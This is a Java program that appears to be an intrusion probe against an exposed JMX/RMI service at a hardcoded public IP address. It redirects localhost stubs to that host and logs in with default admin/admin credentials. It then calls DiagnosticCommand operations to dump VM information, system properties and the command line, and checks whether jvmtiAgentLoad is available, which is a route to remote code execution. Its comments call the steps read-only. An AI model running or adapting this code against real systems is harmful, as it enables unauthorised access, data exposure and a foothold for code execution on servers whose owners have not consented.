import javax.management.*;
import javax.management.remote.*;
import javax.management.remote.rmi.*;
import java.rmi.*;
import java.rmi.server.*;
import java.io.*;
import java.net.*;
import java.util.*;
public class JmxInvoke {
  static final String REAL="160.202.130.243";
  static class RSF extends RMISocketFactory {
    public Socket createSocket(String host,int port) throws IOException {
      if (host==null||host.equals("localhost")||host.equals("127.0.0.1")||host.equals("0.0.0.0")) host=REAL;
      Socket s=new Socket(); s.setSoTimeout(20000); s.connect(new InetSocketAddress(host,port),20000); return s;
    }
    public ServerSocket createServerSocket(int port) throws IOException { return new ServerSocket(port); }
  }
  public static void main(String[] a) throws Exception {
    RMISocketFactory.setSocketFactory(new RSF());
    java.rmi.registry.Registry reg=java.rmi.registry.LocateRegistry.getRegistry(REAL,8085);
    RMIServer stub=(RMIServer)reg.lookup("jmxrmi");
    Map<String,Object> env=new HashMap<>(); env.put(JMXConnector.CREDENTIALS, new String[]{"admin","admin"});
    JMXConnector conn=new RMIConnector(stub,env); conn.connect();
    MBeanServerConnection m=conn.getMBeanServerConnection();
    ObjectName dc=new ObjectName("com.sun.management:type=DiagnosticCommand");
    // Non-destructive read-only DiagnosticCommand ops to confirm invoke capability
    String[] ops={"vmInfo","vmUptime","vmVersion","vmCommandLine","vmSystemProperties","vmClassHierarchy"};
    for (String op:ops){
      try {
        Object r=m.invoke(dc, op, new Object[]{new String[0]}, new String[]{"[Ljava.lang.String;"});
        String s=(r==null)?"null":r.toString();
        System.out.println("\n=== invoke "+op+" OK ===");
        System.out.println(s.substring(0,Math.min(800,s.length())));
      } catch(Exception e){ System.out.println(op+" ERR: "+e.getClass().getName()+": "+e.getMessage()); }
    }
    // Confirm jvmtiAgentLoad exists and is invokable capability (do NOT load real agent)
    MBeanInfo info=m.getMBeanInfo(dc);
    for (MBeanOperationInfo o:info.getOperations()){
      if (o.getName().equals("jvmtiAgentLoad")) {
        System.out.println("\n[jvmtiAgentLoad present] ret="+o.getReturnType()+" sig="+Arrays.toString(Arrays.stream(o.getSignature()).map(p->p.getType()+" "+p.getName()).toArray()));
      }
    }
    conn.close();
  }
}
